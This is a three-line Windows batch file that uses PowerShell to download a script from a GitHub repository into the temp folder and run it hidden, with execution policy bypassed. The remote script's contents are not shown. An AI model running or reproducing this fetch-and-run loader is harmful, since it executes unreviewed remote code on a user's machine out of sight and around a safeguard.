@echo off
powershell.exe /c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/main/bd/nadmin_dinstall.ps1" -OutFile $env:temp/nadmin_dinstall.ps1;Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File "$env:temp/nadmin_dinstall.ps1"' -WindowStyle Hidden
exit
